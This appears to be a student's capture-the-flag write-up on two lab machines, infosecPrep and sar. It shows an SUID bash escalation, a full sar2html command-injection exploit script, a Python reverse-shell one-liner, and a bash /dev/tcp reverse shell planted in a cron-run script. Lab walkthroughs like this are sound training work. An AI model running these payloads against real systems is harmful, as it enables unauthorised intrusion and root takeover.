# infosecPrep
- first of all i scann the open port with nmap
  1. 22 and 80 port is open
  2. with nmap option you can see the file that belongs to the website : robots.txt, secret.txt
  3. open the file secret.txt && decode it to the base64 (cause have equal in end of file)
- connect to the ssh using private key
```
  ssh -i private_key oscp@ip_address
```
- checking the file system using linePeas
  1. you will see /bin/bash have SUID bash binary
  2. after execute it with option -p you will bcome the root

[My refference about privilege escalation](https://delinea.com/blog/linux-privilege-escalation#:~:text=On%20Linux%20systems%2C%20privilege%20escalation,system%20account%20with%20limited%20privileges.)

# sar machine
  - after scanning port i don't see anything important
  - so by curiousity i try to enter to robots.txt then sar2HTML
  - the top left corner i see the version of something that i don't know 
  - i search for sar2html with the version in site google show up her the db for exploit
 
 ```
 import requests
import re
from cmd import Cmd

url = input("Enter The url => ")

class Terminal(Cmd):
    prompt = "Command => "
    def default(self, args):
        exploiter(args)

def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()

if __name__ == ("__main__"):
    terminal = Terminal()
    terminal.cmdloop()
 ```
  - i run this code to insert in it **reverse shell** (python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip_adress",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
  - and listen to the port 
  - now i have access to it
  - using linPeas script you will find there is a file inside crontab run every 5 minute 
  - the file that execute it have inside it another file that we have the access to it
  - we insert in write.sh ** bash -i >& /dev/tcp/192.168.1.65/9999 0>&1 ** and listen to 9999
  - now we have the access to the root
  
  # im not fammiliar with this type of write up && the deadline is almost finish , that's why i wrote it like that !!
